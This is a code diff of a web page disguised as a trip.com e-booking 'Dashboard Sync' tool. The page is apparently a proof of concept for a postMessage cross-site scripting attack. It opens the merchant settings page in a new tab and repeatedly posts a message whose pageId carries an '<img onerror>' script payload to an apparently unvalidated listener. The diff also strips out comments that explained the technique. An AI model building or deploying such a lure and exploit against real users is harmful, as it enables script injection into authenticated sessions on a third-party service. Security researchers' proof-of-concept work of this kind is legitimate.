@@ -15,7 +15,6 @@
 <div class="card">
     <h2>E-Booking Dashboard Sync</h2>
     <p>Click below to open your trip.com merchant roster and synchronize your active sessions.</p>
-    <!-- The user interaction allows us to bypass the browser popup blocker and open a tab -->
     <button class="btn" id="start-sync">Synchronize Dashboard</button>
 </div>
 
@@ -27,7 +26,6 @@
 
     document.getElementById('start-sync').addEventListener('click', () => {
         // 1. Open the target authenticated page in a NEW TAB
-        // Lax cookies are fully attached here because it is a top-level navigation
         const targetTab = window.open("https://ebooking.trip.com/user/setting", "_blank");
 
         // 2. Start a polling loop to inject the payload into the tab as it loads
@@ -35,22 +33,21 @@
         const interval = setInterval(() => {
             attempts++;
             
-            // Stop trying after 50 attempts (~5 seconds) to keep the script efficient
             if (attempts > 50) {
                 clearInterval(interval);
             }
 
             try {
-                // Construct the payload matching the unprotected mountScenarioTrainingNotify listener
+                // Construct the payload with clean, non-conflicting JS backticks
                 targetTab.postMessage({
                     messageType: "mountScenarioTrainingNotify",
-                    pageId: "INJECTED_XSS_PAGE_ID_TEST_<img src=x onerror=alert(XSS_Confirmed)>",
+                    pageId: "INJECTED_XSS_PAGE_ID_TEST_<img src=x onerror=alert(`XSS_Confirmed`)>",
                     sceneKeys: ["INJECTED_SCENE_KEY_1", "INJECTED_SCENE_KEY_2"]
-                }, "*"); // Targeting any origin (*) due to lack of origin validation
+                }, "*"); 
             } catch (e) {
-                // Fail silently while the tab is resolving cross-origin loading states
+                // Fail silently while tab loads cross-origin
             }
-        }, 100); // Check every 100 milliseconds
+        }, 100); 
     });
 </script>
 
